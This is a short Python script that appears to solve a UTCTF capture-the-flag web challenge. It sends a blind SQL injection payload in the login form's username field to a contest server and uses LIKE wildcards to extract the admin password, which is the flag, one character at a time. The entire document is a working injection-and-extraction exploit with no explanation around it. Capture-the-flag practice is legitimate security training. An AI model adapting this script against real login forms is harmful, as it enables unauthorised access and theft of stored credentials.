import requests
import string

def test(s):
    r = requests.post('http://web2.utctf.live:5006/', data={'username': f"admin' and password like '{s}'--", 'pass':""})
    return r.text.find('Welcome, admin!') != -1

s = 'utflag{'

chars = ['[_]'] + list(string.ascii_lowercase + string.digits)

cnt = 16
found = 0
for i in range(cnt):
    for j in chars:
        ss = s + j + '_' * (cnt - found - 1) + '}'
        print(ss)
        if test(ss):
            found += 1
            s += j
            print(f'[+] pass[{i}] : {j} ' + '#' * found + str(found / cnt) + '%')
            break
        else:
            print(f'[X] pass[{i}] : {j}')
